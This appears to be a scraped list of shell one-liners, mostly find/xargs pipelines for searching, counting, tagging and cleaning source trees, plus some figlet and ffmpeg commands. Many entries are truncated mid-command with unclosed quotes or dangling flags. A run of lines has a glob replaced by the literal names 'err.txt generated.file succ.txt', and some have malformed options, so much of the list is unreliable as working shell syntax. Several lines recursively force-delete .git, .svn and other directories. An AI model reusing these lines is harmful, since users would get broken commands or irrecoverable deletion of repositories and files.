find . -name \*.c -o -name \*.h -o -name \*.cpp | xargs indent -bap -bli0 -i4 -l119 -ncs -npcs -npsl -fca -lc119 -fc1 -ts4 -nuts
find . -name \*.c -o -name \*.cpp -type f| xargs grep -n --color
find . -name \*._*|xargs \rm
find . -name \*.\[ch\]\* | ctags -L - --sort=foldcase --c++-kinds=+p --fields=+iaS --extra=+q --language-force=C++
find . -name \*.\[ch\] | ctags -L - --sort=foldcase
find . -name \*.\*hs | xargs hasktags -c
find . -name \*.[ch] -print | etags --filter=yes > TAGS
find . -name \*.*\* -print0 | xargs -0 grep
find . -name \* | xargs grep -ins
find . -name \* | xargs grep -i
find . -name \* -print | grep
find . -name \#*\# -print0 | xargs -0 rm -rf
find . -name Makefile.in | xargs -I {} -t ls -l {}
find . -name Makefile | xargs rm
find . -name Makefile | xargs grep
find . -name Kconfig | xargs grep
find . -name Icon$'\r' -print0|xargs -0 rm
find . -name Entries -print0 | xargs -0 grep -l CVS
find . -name CMakeLists.txt | xargs grep --color=always -C5
find . -name .terraform -type d | xargs rm -r
find . -name .svn | xargs rm -rf
find . -name .svn -prune -o -name .git -prune -o -name '*.swp' -prune -o -type f -print0 | xargs -0 grep --color
find . -name .svn -prune -name .git -prune -o -type f -print0 | xargs -0 grep -H --color
find . -name .svn -print0 | xargs -0 rm -rf
find . -name .gitattributes | map dirname
find . -name .git -type d | xargs -n1 -P4 -I% git --git-dir=% --work-tree=%/.. remote update -p
find . -name .git -type d | xargs -n1 -P4 -I% git --git-dir=% --work-tree=%/.. fetch --all --recurse-submodules
find . -name .git -print0 | xargs -0 rm -rf
find . -name .gen_lastrun | xargs rm
find . -name .ctags.local -type f -print0 | xargs --null -n 1 -IX sh -c 'cd \`dirname \
find . -name .DS_Store | xargs rm -f
find . -name .DS_Store | xargs rm
find . -name .DS_Store -type f -delete ; find . -type d -print0 | xargs -0 dot_clean -m
find . -name .DS_Store -type f -delete ; find -name .Trashes -type d -delete ; find . -type d | xargs dot_clean -m
find . -name .DS_Store -print0 | xargs rm -v
find . -name .DS_Store -print0 | xargs -0 rm -rf
find . -name .DS_Store -print0 | xargs -0 rm
find . -name .DS_Store -print0 | xargs -0 git rm -f --ignore-unmatch
find . -name .DS_Store -print0 | xargs -0 git rm --ignore-unmatch ; echo 'done!'
find . -name .DS_Store -print0 | xargs -0 git rm --ignore-unmatch
find . -name *~ -print0 | xargs -0 rm -rf
find . -name *.swp | xargs rm
find . -name *.swp -print0 | xargs -0 rm
find . -name *.swp -a -type f | xargs rm
find . -name *.spec | xargs awk
find . -name *.so -or -name *.pyc | xargs rm; rm -rf build
find . -name *.retry -print0 | xargs -0 rm -rf
find . -name *.rb | xargs grep -n
find . -name *.pyc | xargs rm -v
find . -name *.pyc | xargs rm -f
find . -name *.pyc | xargs rm
find . -name *.py | xargs wc -l
find . -name *.py | xargs grep --color=auto -ri
find . -name *.pm | xargs grep
find . -name *.out -print0 | xargs -0 rm -f
find . -name *.orig | xargs rm -f
find . -name *.js | xargs wc -l
find . -name *.java | grep $1
find . -name *.h | xargs grep -nH
find . -name *.h -o -name *.cpp -o -name *.c | xargs clang-format -i -style=Mozilla
find . -name *.css | xargs wc -l
find . -name *.cpp | xargs grep -nH
find . -name *.cpp -o -name *.h -o -name *.hpp | xargs ctags -R --language-force=c++ --extra=+q --fields=+i
find . -name *.conf | xargs grep
find . -name *.*~ -print0 | xargs -0 rm
find . -name 'requirements.txt' -exec cat {} \; > cr; cat cr | tr -s \
find . -name 'node_modules' | xargs -I {} rm -fr {}
find . -name 'node_modules' -type d -prune -print | xargs du -chs
find . -name 'node_modules' -type d -d | xargs rm -rf
find . -name 'json_diff.txt' | xargs grep
find . -name 'core.*' | xargs rm
find . -name 'Device*xml' | xargs less
find . -name 'AndroidManifest.xml' | xargs tidy -xml -i
find . -name '.svn' -type d | xargs rm -rf
find . -name '.svn' -type d -print | xargs rm -rf {}
find . -name '.settings' -o -name '.project' -o -name '.classpath' -o -name 'target' | xargs rm -rf ;
find . -name '.git' -prune -o -type f -print0 | xargs -0 sed -i ''
find . -name '.git' -maxdepth 1 | xargs rm -rf
find . -name '.DS_Store' | xargs rm -rf
find . -name '.DS_Store' | xargs rm
find . -name '.DS_Store' -type f -delete 2>&1 | grep -v 'Operation not permitted'
find . -name '.DS_Store' -print0 | xargs -0 rm -f {}
find . -name '.*.swp' | xargs rm -f
find . -name '.*.sw[op]' | xargs rm -f
find . -name '.*.sw[op]' | xargs rm
find . -name '*~' | xargs rm -f
find . -name '*~' -o -name '.*~' | xargs rm -fv
find . -name '*~' -o -name '.*~' -o -name '*.swo' -o -name '*.swp' -o -name '.*.swp' -o -name '.*.swo' |xargs rm
find . -name '*~' -o '*#*' | xargs rm -f
find . -name '*yaml' -type f | xargs grep -E
find . -name '*sw[m-p]' | xargs rm
find . -name '*scss' -type f | xargs grep -E
find . -name '*pp' -type f | xargs grep -E
find . -name '*po' -type f | xargs grep -E
find . -name '*php' -type f | xargs grep -E
find . -name '*mp3' -print0 | xargs -0 mid3iconv -e UTF-8 -d
find . -name '*js' | xargs grep 2>/dev/null --color -i
find . -name '*js' -type f | xargs grep -E
find . -name '*css' -type f | xargs grep -E
find . -name '*.zip' | while read filename; do unzip -o -d '`dirname '$filename'`' '$filename'; done;'
find . -name '*.yml' -not -path './roles/\*/files/\*' | xargs -t -n1 ansible-playbook --syntax-check
find . -name '*.webp' | parallel -eta dwebp {} -o {.}.png
find . -name '*.ui' | xargs xmllint --noout --format
find . -name '*.swp' -print0 | xargs -0 trash -i --
find . -name '*.sw[op]' -print0 | xargs -0 rm -v
find . -name '*.sw*' | xargs rm
find . -name '*.sql'|xargs grep
find . -name '*.sh' | xargs grep -i
find . -name '*.sh' -type f -print0 | xargs -0 grep
find . -name '*.scss' | xargs grep -i
find . -name '*.rej' -or -name '*.orig' -or -name '*~' -or -name '*.lock' -and -not -name 'Gemfile.lock' | xargs rm -f
find . -name '*.rb' | xargs grep -n
find . -name '*.rb' | xargs grep -i
find . -name '*.rb' | xargs ctags -a
find . -name '*.rb' | xargs /usr/local/bin/ctags -a -e -f TAGS
find . -name '*.rb' | xargs /usr/bin/ctags -R -a -f tags
find . -name '*.rb' | xargs /usr/bin/ctags -R -a -f TAGS
find . -name '*.rb' -o -name '*.rhtml' -o -name '*.rjs' -o -name '*.sass' -o -name '*.php' -o -name '*.yml' -o -name '*.css' -o -name '*.c' -o -name '*.m' -o -name '*.h' -o -name '*.xml\' -o -name '*.js' -o -name '*.erb' -type f | xargs grep -in
find . -name '*.rb' -o -name '*.erb' -o -name '*.sql' -o -name '*.rhtml' -o -name '*.journal' -o -name '*.rjs' -o -name '*.yml' -o -name '*.rake' -o -name '*.rxml' -o -name '*.css' -o -name '*.xml' -o -name '*.js' -type f | xargs grep -n
find . -name '*.rb' -not -path '*/generators/*/templates/*' -not -path '*/vendor/*' -exec ruby -W1 -T1 -c \\{\\} \\; | grep -v 'Syntax OK'
find . -name '*.pyc\' | xargs rm -f
find . -name '*.pyc'|xargs rm -rf
find . -name '*.pyc' | xargs rm -v
find . -name '*.pyc' | xargs rm -rf
find . -name '*.pyc' | xargs rm -f
find . -name '*.pyc' | xargs rm
find . -name '*.pyc' | while read line; do echo DEL \$line; rm \$line; done
find . -name '*.pyc' -print0|xargs -0 rm
find . -name '*.pyc' -or -name '*.orig' -or -name '*.swp' -or -name '*.swo' -or -name '*.log' -or -name Pyro_log -or -name '*.egg-info' | xargs rm -vRf
find . -name '*.py'|xargs grep -n
find . -name '*.py'|xargs grep -A3 -B1 -n --color
find . -name '*.py'|xargs grep
find . -name '*.py' | xargs grep -n
find . -name '*.py' | xargs grep -I
find . -name '*.py' | xargs grep --line-number
find . -name '*.py' | xargs grep --color -in
find . -name '*.py' | xargs grep --color
find . -name '*.py' | xargs grep
find . -name '*.py' | xargs etags
find . -name '*.py' | xargs egrep
find . -name '*.py' -type f -print0 | xargs -0 grep
find . -name '*.proto' | xargs grep -n
find . -name '*.png' | parallel -eta cwebp {} -o {.}.webp
find . -name '*.phtml' | xargs grep 2>/dev/null --color -i
find . -name '*.phtml' | xargs grep 2>/dev/null --color
find . -name '*.php'|xargs grep -n
find . -name '*.php' | xargs wc -l
find . -name '*.php' | xargs grep 2>/dev/null --color -i
find . -name '*.php' | xargs grep 2>/dev/null --color
find . -name '*.php' | xargs grep -i
find . -name '*.php' -print0 | xargs -0 grep -l '^M$'
find . -name '*.php' -exec php -l {} \; | grep -v 'No syntax errors detected'
find . -name '*.orig' | xargs rm
find . -name '*.mk' | xargs grep -I
find . -name '*.mk' -or -name '?akefile' | xargs sed -i -e 's/-arch ppc//g'
find . -name '*.log' | xargs rm
find . -name '*.jsonnet' | xargs jsonnetfmt -i
find . -name '*.json'|xargs grep
find . -name '*.js*' -not -path '*/node_modules*' -not -path '*/semantic*' -not -path '*/bower*' -not -path '*/public*' | xargs wc -l
find . -name '*.js'|xargs grep -n
find . -name '*.js' | xargs wc -l
find . -name '*.js' | xargs js-beautify -r
find . -name '*.js' | xargs grep 2>/dev/null --color
find . -name '*.js' | xargs grep -i
find . -name '*.js' | xargs grep --color
find . -name '*.js' -print0 | xargs -0 sed -i 's/^[ \t]*//g'
find . -name '*.js' -print | xargs ctags
find . -name '*.java' | xargs wc -l
find . -name '*.java' | xargs grep -n
find . -name '*.java' | xargs grep -i
find . -name '*.java' -o -name '*.xml' -o -name '*.mk' | cscope -i- -bq
find . -name '*.java' ! -path '*./target/*'| xargs wc -l
find . -name '*.java' ! -path '*./target/*' ! -path '*test*' | xargs wc -l
find . -name '*.html'|xargs grep -n
find . -name '*.html'|xargs grep
find . -name '*.html' | xargs grep --color
find . -name '*.hrl' | xargs grep -n
find . -name '*.h'|xargs grep -A3 -B1 -n --color
find . -name '*.h' | xargs grep -n
find . -name '*.h' | xargs grep --color
find . -name '*.h' | xargs grep
find . -name '*.h' -or -name '*.c' -or -name '*.cpp' -or -name '*.cc' | xargs grep --color
find . -name '*.h' -or -name '*.c' -or -name '*.cpp' -or -name '*.cc' | xargs grep
find . -name '*.h' -o -name '*.cc' -o -name '*.cu' | xargs wc -l
find . -name '*.groovy' -o -name '*.java' | xargs grep -i
find . -name '*.go' | xargs wc -l
find . -name '*.go' | xargs grep -n
find . -name '*.go' ! -path './build/*' ! -path './vendor/*' | xargs gotags >> tags
find . -name '*.gd' | xargs wc -l
find . -name '*.erl' | xargs grep -n
find . -name '*.el' | xargs grep -n
find . -name '*.css'|xargs grep
find . -name '*.css' | xargs grep -i
find . -name '*.cs' | xargs grep 2>/dev/null --color -i
find . -name '*.cs' | xargs grep 2>/dev/null --color
find . -name '*.cpp'|xargs grep -A3 -B1 -n --color
find . -name '*.cpp' | xargs grep -n
find . -name '*.cpp' | xargs grep --color
find . -name '*.cpp' -o -name '*.cc' -o -name '*.c' -o -name '*.php' -o -name '*.conf' -o -name '*.h' -o -name '*.lua' | xargs grep -n --color
find . -name '*.coffee'|xargs grep -n
find . -name '*.coffee' | xargs coffeelint
find . -name '*.cc' | xargs grep -n
find . -name '*.c' | xargs svn propset svn:keywords \
find . -name '*.c' | xargs grep -n
find . -name '*.c' | xargs grep --color
find . -name '*.[mch]' -or -name '*.java' -or -name '*.wos' -or -name '*.cc' -or -name '*.cpp' | xargs agrep -l
find . -name '*.[mch]' -or -name '*.java' -or -name '*.rb' -or -name '*.wos' -or -name '*.cc' -or -name '*.cpp' | xargs agrep -n
find . -name '*.[h]' | xargs grep -i $1
find . -name '*.[eo][1-9]*' | xargs rm
find . -name '*.[ch]' | xargs grep -i $1
find . -name '*.[ch]' | xargs etags
find . -name '*.R' -o -name '*.Rmd' | xargs grep TODO
find . -name '*.R' -o -name '*.Rmd' | xargs grep IDEA
find . -name '*.R' -o -name '*.Rmd' | xargs grep FIXME
find . -name '*.*css'|xargs grep -n
find . -name '*.*' | xargs wc -l
find . -name '*.(swp|un~)' -exec rm -i '{}' \;
find . -name '*'|xargs grep
find . -name '*' | xargs wc -l
find . -name '*' | xargs grep -i
find . -name '*' | grep $*
find . -name '*${2}' -print | xargs grep -nir '${1}';
find . -name $TO_REMOVE -print0 | xargs -0 rm -rf
find . -name $1 -print0 | xargs -0 /bin/rm -fv
find . -mtime -1 -print | more
find . -mtime +1 | awk '{print $1}'
find . -mindepth 2 | awk -F/ {
find . -mindepth 2 -type f -print0 | xargs -0 -I {} mv --backup=numbered {} .
find . -mindepth 1 -maxdepth 1 -type d | wc -l
find . -mindepth 1 -maxdepth 1 -type d -print | parallel 'echo \>\>\> {} && git -C {} pull' \;
find . -maxdepth 5 -type d | sed -e
find . -maxdepth 4 -type d | sed -e
find . -maxdepth 3 -type d | sed -e
find . -maxdepth 1 \( -not -name .\* \) -type f -print0 | xargs -0r ls --color=auto -h
find . -maxdepth 1 -type l -print | while read line; do ls -alc
find . -maxdepth 1 -type f | xargs ls -ldh
find . -maxdepth 1 -type f | xargs ls -d
find . -maxdepth 1 -type f | xargs grep -in --color=always
find . -maxdepth 1 -type f | wc -l
find . -maxdepth 1 -type f | cut -c 3-
find . -maxdepth 1 -type f -size 0 | xargs rm
find . -maxdepth 1 -type f -size -1000c -print0 | xargs -0 /usr/bin/git --git-dir=$HOME/.myconf/ --work-tree=$HOME add; config status
find . -maxdepth 1 -type f -printf '%TY-%Tm-%Td_%TH:%TM %f\n' | sort -r
find . -maxdepth 1 -type f -print0 | xargs -0r ls
find . -maxdepth 1 -type f -empty | xargs rm
find . -maxdepth 1 -type d|columnize
find . -maxdepth 1 -type d | xargs -n 1 du -sh
find . -maxdepth 1 -type d | wc -l
find . -maxdepth 1 -type d | sort
find . -maxdepth 1 -type d -print0 | xargs -0 du -skh
find . -maxdepth 1 -type d -print0 | xargs -0 -I {} sh -c
find . -maxdepth 1 -type d -print | sort
find . -maxdepth 1 -type d -exec du -sh {} \; | sort -hr
find . -maxdepth 1 -type d -exec du -s {} \; | sort -g
find . -maxdepth 1 -type d ! -name \.\* -print0 | xargs -0 ls -ld
find . -maxdepth 1 -perm /111 | xargs ls -ld --color=tty
find . -maxdepth 1 -perm /111 -type f | xargs ls -ld
find . -maxdepth 1 -perm /111 -type d | xargs ls -ld
find . -maxdepth 1 -perm /077 | xargs ls -ld
find . -maxdepth 1 -perm /044 | xargs ls -ld
find . -maxdepth 1 -perm /022 | xargs ls -ld
find . -maxdepth 1 -perm /011 | xargs ls -ld
find . -maxdepth 1 -name '*~' -o -name '.*~' -o -name '*.swo' -o -name '*.swp' -o -name '.*.swp' -o -name '.*.swo' |xargs rm
find . -maxdepth 1 -exec echo \; | wc -l
find . -maxdepth 1 -exec du -sk {} 2>/dev/null \;|sort -g
find . -iname debug.txt -o -iname save.txt|xargs rm -rv
find . -iname \*~ | xargs rm -f
find . -iname \*.py | xargs gvim
find . -iname \*.mp3 | mpg123 -z -@ - -b 4096
find . -iname \*.[h] 2>/dev/null| xargs grep --color -n 2>/dev/null
find . -iname \*.[h] 2>/dev/null| xargs grep --color -in 2>/dev/null
find . -iname \*.[ch] 2>/dev/null| xargs grep --color -n 2>/dev/null
find . -iname \*.[ch] 2>/dev/null| xargs grep --color -in 2>/dev/null
find . -iname \*.[c] 2>/dev/null| xargs grep --color -n 2>/dev/null
find . -iname \*.[c] 2>/dev/null| xargs grep --color -in 2>/dev/null
find . -iname \!* | xargs gvim
find . -iname .DS_Store | xargs --no-run-if-empty rm
find . -iname *.pyc | xargs -I {} rm -f {}
find . -iname '*php' | xargs grep -n
find . -iname '*.xml' | sed \
find . -iname '*.tex' | xargs grep
find . -iname '*.swp' -print0 | xargs -0 rm
find . -iname '*.rb' | sed \
find . -iname '*.pyc' | xargs rm -f
find . -iname '*.php' -or -iname '*.inc' | sed \
find . -iname '*.metadata*' | xargs -I {} du -sh {}
find . -iname '*.lua' | xargs grep --color -i
find . -iname '*.js' | sed \
find . -iname '*.h' -print0 | xargs -0 grep -H
find . -iname '*.h' -o -iname '*.hh' -o -iname '*.hpp' -o -iname '*.c' -o -iname '*.cc' -o -iname '*.cpp' -o -name '*.cxx' | xargs clang-format -i -style=Google
find . -iname '*.c' | xargs grep --color -i
find . -iname '*.[chS]' -or -iname '*.cc' -and -not \( -name '.#' -o -name '#*#' -o -name '*\.~*.~' -o -path '*./CVS/*.' \) -print0 | xargs -0 grep -H
find . -follow -type f | xargs grep -H -n $1
find . -follow -type f -name \*.txt | xargs grep -H -n $1
find . -follow -type f -name \*.h | xargs grep -H -n $1
find . -follow -type f -name \*.cpp -o -name \*.c -o -name \*.C -o -name \*.cxx -o -name \*.c++ | xargs grep -H -n $1
find . -follow -type f -name \*.c | xargs grep -H -n $1
find . -follow -type f -name \*.[hcmCSs] -o -name \*.asm -o -name \*.cpp -o -name \*.inc -o -name \*.cxx -o -name \*.c++ -o -name \*.tcl -o -name \*.itcl -o -name \*.pl -o -name \*.sh -o -name \?akefile\* -o -name \*.mk -o -name \*.def -o -name \*commondefs -o -name \*commonrules -o -name ismdefs -o -name ismrules | xargs grep -H -n $1
find . -follow -name \*.py | ctags -f .tags -L -
find . -depth -type d | xargs rmdir 2> /dev/null
find . -d | grep .git$
find . --type f | xargs nkf --guess
find . err.txt generated.file succ.txt | mpv -fs --image-display-duration=1 --playlist=-
find . err.txt generated.file succ.txt -print0 | xargs -0 wc -l
find . err.txt generated.file succ.txt -print0 | egrep -v
find . ${FXG_IGNOR} | xargs grep
find . ${FIND_OPT} -o -type d -iname '[Rr]ealase -exec find {} '*.src' -print \; | xargs echo
find . ! \( -path './.*' -prune \) ! \( -iname 'tags' -or -iname '*.txt' -or -iname '*.md' -or -iname 'Makefile*' -or -iname 'LICENSE' -or -iname 'README' \) -type f | xargs grep
find . ! \( -path './.*' -prune \) ! \( -iname 'tags' -or -iname '*.txt' -or -iname '*.md' -or -iname '*.htm' -or -iname '*.html' -or -iname 'Makefile*' -or -iname 'LICENSE' -or -iname 'README' -or -iname '*.png' \) -type f | xargs -0 grep
find . ! -type d -printf '%TY-%Tm-%Td %TH:%TM:%TS %p\\n' | sort
find . ! -name tags | xargs grep -sin --color
find . ! -name . -prune -type l|xargs rm
find . ! -name . -prune -type l | xargs rm
find . ! -name . -prune -print | grep -c /
find -x . type f -size +100M -exec du -m {} \; | sort -n
find -type f|wc
find -type f | xargs wc -l
find -type f | xargs grep -in --color=always
find -type f | xargs grep -a --color -r -i -P
find -type f | xargs grep -a --color -r -i -E
find -type f | xargs grep -a --color -r -P
find -type f | xargs grep -a --color -r -E
find -type f | xargs grep --color
find -type f | xargs grep
find -type f | xargs dos2unix
find -type f | wc -l
find -type f | sort
find -type f | p4 -x - add
find -type f | grep -s
find -type f | grep -i
find -type f | grep -E
find -type f | grep
find -type f \( -iname \*.c -o -iname \*.cpp -o -iname \*.h \) -print0 | xargs -0 sed -i
find -type f . | grep
find -type f -printf '%T+ %p\n' | sort
find -type f -print0|xargs -0 dos2unix
find -type f -print0 | xargs -r0 grep -in
find -type f -print0 | xargs -r0 grep -F
find -type f -print0 | xargs -0 grep -s
find -type f -print0 | xargs -0 grep --color
find -type f -print0 | xargs -0 cp -l -t
find -type f -print0 | xargs -0 chmod 0664
find -type f -print0 | xargs -0 -n 1 -P 0
find -type f -print0 2>/dev/null | xargs --null less
find -type f -not -empty | sort
find -type f -name project.json -print0 | xargs -0 grep 'version' {}
find -type f -name *.orig | xargs rm
find -type f -iname \*.py | sed -e 's#.*#\
find -type f -iname \*.m | sed -e 's#.*#\
find -type f -iname \*.h | sed -e 's#.*#\
find -type f -iname \*.cpp | sed -e 's#.*#\
find -type f -iname \*.cpp -or -iname \*.h | sed -e 's#.*#\
find -type f -iname \*.cpp -or -iname \*.[ch] | sed -e 's#.*#\
find -type f -iname \*.c | sed -e 's#.*#\
find -type f -iname \*.[ch] | sed -e 's#.*#\
find -type f -follow | xargs grep -a --color -r -i -P
find -type f -follow | xargs grep -a --color -r -i -E
find -type f -follow | xargs grep -a --color -r -P
find -type f -follow | xargs grep -a --color -r -E
find -type f -executable -exec file -i \'{}\' \; | grep \'charset=binary\'
find -type f -empty | sort
find -type d | xargs rmdir -p
find -type d | sort -d
find -type d | sort
find -type d | grep -i
find -type d | grep
find -type d -print0 | xargs -0 chmod 0775
find -type d -not -empty | sort
find -type d -name '.svn' | xargs rm -rf
find -type d -name '.svn' -prune -o -type f -print | xargs grep
find -type d -name '.git' | xargs rm -rf
find -type d -name '*target' | sudo xargs rm -r
find -type d -empty | sort
find -size 0k -print0 | xargs -r0 rm
find -size 0 | xargs rm
find -regex '.*\.pyc\|.*__pycache__' -delete
find -print0 | xargs -0 grep --color=always
find -print0 | fzfxargs
find -not -empty | sort
find -name target -type d | xargs rm -rf
find -name diff.txt | xargs rm
find -name core -type f -print0 2>/dev/null | xargs -0 rm
find -name build.sbt -o -name plugins.sbt | xargs grep -in --color=auto
find -name \*.zcml|xargs grep -n --color
find -name \*.py|xargs grep --color -n
find -name \*.pt|xargs grep --color -n
find -name \*.po|xargs grep --color -n
find -name \*.log.gz -print0 | xargs -0 zgrep
find -name \*.gz -print0 | xargs -0 zgrep
find -name .git -type d | sort
find -name *.sw[lmnop] | xargs rm -f
find -name *.pyc | xargs rm
find -name *.orig | xargs rm -v
find -name *.orig | xargs rm -f
find -name '*swp' -type f | xargs rm
find -name '*swo' -type f | xargs rm
find -name '*pyc' -type f | xargs rm
find -name '*mp4' -o -name '*mkv' -o -name '*avi' | sort
find -name '*.zip' |xargs rm -v
find -name '*.sw*' | xargs rm
find -name '*.py' | xargs grep
find -name '*.png' -print0 | xargs -0 optipng -o7 -strip all
find -name '*.orig' | xargs -r rm
find -name '*.jpg' -print0 | xargs -0 jpegoptim --max=85 --strip-all --preserve --totals {} \;
find -name '*.html' | xargs touch
find -name '*.c' | xargs grep --color 'TODO'
find -name '*.[hc]' -print0 -o -name '*.cpp' -print0 | xargs -0 ctags --fields=+aS --extra=+q --file-scope=no
find -name '* *' -type d -or -type f | rename 's/\ /_/g'
find -mindepth 1 -maxdepth 1 -type d | xargs du -sh
find -maxdepth 2 -type f -iname \*.mp3 | sort > playlist.pls
find -maxdepth 2 -name Gemfile.lock | xargs git checkout
find -maxdepth 1 | grep -Fi
find -maxdepth 1 | egrep -i
find -maxdepth 1 -type f | xargs grep -F
find -maxdepth 1 -type f | wc -l
find -maxdepth 1 -type f -iname \*.mp3 -o -iname \*.flac -o -iname \*.ogg -o -iname \*.wav -o -iname \*.aac | sort > playlist
find -maxdepth 1 -type d | xargs -I % zsh -c '{ if [ -d \
find -maxdepth 1 -type d | xargs -I % mksh -c '{ if [ -d \
find -maxdepth 1 -type d | while read -r dir; do printf
find -maxdepth 1 -type d | wc -l
find -iname \*|xargs grep -il
find -iname \*.h | xargs grep -nH --color=auto
find -iname \*.c -o -iname \*.cc -o -iname \*.cpp | xargs grep -nH --color=auto
find -iname \* | xargs grep -nH --color=auto
find -iname *.swp -type f -print0 2> /dev/null | xargs -0 rm -vf
find -iname '*.mp3' -print0 | xargs -0 mid3iconv -eCP1251 --remove-v1
find -iname '*.html' -printf '%f\n' | xargs -I{} sh -c 'printf \
find -iname '*.html' -printf '%f\n' | xargs -I{} sh -c 'echo \
find -iname '*.gcda' | xargs rm
find -follow | grep -i
find -f . err.txt generated.file succ.txt | grep
find -empty | sort
find -L regex '.*\.\(xml\)$' | xargs egrep --line-number
find -L . \( -type d -name .svn -prune \) -or \( -type d -name .git -prune \) -or -not -type f -or -print0 | xargs -0 grep -Iie
find -L . -xtype f ! -wholename *.svn* -print0 | xargs -0 -n8 -P24 grep -I --color=auto
find -L . -type l | xargs -t -I {} rm {}
find -L . -type f 2>&1| egrep
find -L . -type f -print0 | xargs -0 grep -i
find -L . -type f -print0 | xargs -0 ag
find -L . -type f -exec grep -Iq . {} \; -and -print 2>&1 | xargs egrep -n
find -L . -print | grep
find -L . -path '*/migrations' -prune -o -path '*/docs' -prune -o -path '*/.svn' -prune -o -path '*/.git' -prune -o \( -type f -a \! -name tags -a \! -name cscope.out -a \! -name '*.sql' -a \! -name '*.po' -a \! -name '*.mo' \) -print0 | xargs -0 grep --color -I -n
find -L . -name '*.php' -print0 | xargs -0 -n 1 -P 4 php -l
find -H ./ -name '*.[csSh]' | etags -
find -E . -type d \! -regex '.*\.(git|svn).*' -exec dirtags {} \;
find -E . -regex '.*(\.DS_Store|__pycache__).*' -ls -delete
find -D tree . | sort -R --random-source=/dev/urandom > playlist.m3u
find */cache/dev/twig -type f -exec sh -c 'echo {} && head -n 3 {} | tail -n 1 && echo' \;
find */ -type f | wc -l
find *.pyc | xargs rm
find **/*.rb | entr
find err.txt generated.file succ.txt |xargs grep --color=auto --exclude=\*.git\* -n 2> /dev/null
find err.txt generated.file succ.txt | xargs grep -sn
find err.txt generated.file succ.txt | peco
find err.txt generated.file succ.txt | grep -nri
find err.txt generated.file succ.txt | grep -i
find err.txt generated.file succ.txt | fzf
find err.txt generated.file succ.txt -type f | xargs grep -l
find err.txt generated.file succ.txt -type f | grep -E --color --
find err.txt generated.file succ.txt -type f | grep
find err.txt generated.file succ.txt -type f | fzf > selected
find err.txt generated.file succ.txt -type f | fzf
find err.txt generated.file succ.txt -type f -print0 | xargs -0 grep -l
find err.txt generated.file succ.txt -type f -name '*~' -print0 | xargs -0 rm
find err.txt generated.file succ.txt -type f -name '*.php' -print | xargs grep -inr
find err.txt generated.file succ.txt -type d | fzf
find err.txt generated.file succ.txt -type d -print0 | xargs -0 chmod 0755
find err.txt generated.file succ.txt -maxdepth 1 -mindepth 1 -type d | sort
find err.txt generated.file succ.txt -maxdepth 0 | wc -l
find err.txt generated.file succ.txt -maxdepth 0 -type d | while read repo; do echo \
find err.txt generated.file succ.txt -follow | grep -i
find err.txt generated.file succ.txt ! -type l -ls | sort -k 7nr
find './src' -name '*.js' -not -path './node_modules/*' | xargs wc -l
find ${LogDirPath}/data/ | sed
find ${LogDirPath}/data/ -type d | sed
find ${HOME} | fzf
find $pwd -type f | wc -l
find $myHome/dev-local-bash -type f | xargs grep --color -i
find $SCRATCHDIR/gaussian -name '*.log' -exec sh -c 'echo; echo {}; grep Predicted -B5 {} | tail -6' \;
find $Path -name \*.[hc] -or -name \*.cpp |xargs
find $PWD |grep
find $PWD | grep
find $PWD -type d -name .git | xargs -n 1 dirname
find $MASTER_PORTAGE -mindepth 2 -maxdepth 2 -xtype d | sed s#$MASTER_PORTAGE##
find $HOME/.vim/swaps -name '*.sw[a-z]' | xargs rm
find $HOME/ -name '*.log' -exec sh -c 'echo; echo {}; grep Predicted -B5 {} | tail -6' \;
find $HOME -name .git -type d | xargs -n1 -P4 -I% git --git-dir=% --work-tree=%/.. fetch --all --recurse-submodules
find $GOPATH -name '*.go' | grep -E \
find $1 -type f -print0 | xargs -0 sed -i '' 's/$2/$3/g'
find $1 -type d -print0 | xargs -0 stat --format
find $(pwd) | grep -in
find $(pwd) -type f -print0 | xargs -0 -P 4 -n 40 grep --color=always -iH
find $(pwd -P) -maxdepth 1 -type d -exec du -sh {} + 2>/dev/null | sort -h
find $( pwd ) -follow -type f 2>/dev/null| xargs grep --color -e
filetotail=$(dir -tr1 | tail -1; ); echo \*\*\* Tailing $filetotail \*\*\*; tail -f $filetotail
files | less -r
files -d | __filter_execute cd
files -A | __filter_execute vim
files -A | __filter_execute nvim
filecount=find . -type f | wc -l
filecoin show block `filecoin chain head|head -n 1`;date
file=$(fd setup.zsh | fzf) && source $file
file err.txt generated.file succ.txt | grep directory
figlet woot | cowsay -n -f stegosaurus
figlet tpx; cd ~/git/terraform && git st; for a in int qa staging prod; do figlet $a; cd ~/git/terraform/$a && pwd && terraform init | grep -i initializ && tpf; done; cd ~/git/terraform && git st
figlet btw i use arch | lolcat
figlet Was gibt es heute zu essen? | cowsay -nf vigor2
figlet I Love Avgust | lolcat
figlet FAIL | cat
figlet ACCESS GRANTED | nms && ssh
figlet -f slant -c $HOSTNAME | lolcat && neofetch
figlet -d ~/.flf/ -f isometric1.flf taac | lolcat
figlet '()RI()N'|lolcat
figlet $(ls ~/Downloads/ | wc -l)
fh | xargs grep $@
ffyml | xargs grep -H -n
ffyml | xargs fgrep --color -H -n
ffyaml | xargs grep -H -n
ffxml | xargs grep -H -n
ffxml | xargs fgrep --color -H -n
fftxt | xargs grep -H -n
fftxt | xargs fgrep --color -H -n
ffts | xargs grep -H -n
ffts | xargs fgrep --color -H -n
fftoml | xargs grep -H -n
ffsql | xargs grep -H -n
ffsql | xargs fgrep --color -H -n
ffsh | xargs grep -H -n
ffsh | xargs fgrep --color -H -n
ffscala | xargs grep -H -n
ffscala | xargs fgrep --color -H -n
ffsbt | xargs grep -H -n
ffsbt | xargs fgrep --color -H -n
ffrst | xargs grep -H -n
ffrs | xargs grep -H -n
ffrs | xargs fgrep --color -H -n
ffpy | xargs grep -H -n
ffpy | xargs fgrep --color -H -n
ffprop | xargs grep -H -n
ffprop | xargs fgrep --color -H -n
ffprof | xargs grep -H -n
ffprof | xargs fgrep --color -H -n
ffpom | xargs grep -H -n
ffpom | xargs fgrep --color -H -n
ffmpeg_thumbsI #usage ? <AVC|HEVC file> <nbIFrameToDecode>
ffmpeg -y -f x11grab -s $(xdpyinfo | awk
ffmpeg -i ~/Desktop/screen_cap.mov -vf scale=600:-1 -r 10 -f image2pipe -vcodec ppm - | convert -delay 5 -layers Optimize -loop 0 - ~/Desktop/screen_cap.gif
ffmpeg -i in.mov -s 900x600 -pix_fmt rgb24 -r 10 -f gif - | gifsicle --optimize=2 --delay=10 >
ffmpeg -i in.mov -s 600x400 -r 10 -f gif - | gifsicle --optimize=3 --delay=3 > out.gif
ffmpeg -i in.mov -s 600x400 -pix_fmt rgb24 -r 10 -f gif - | gifsicle --optimize=3 --delay=3 > out.gif
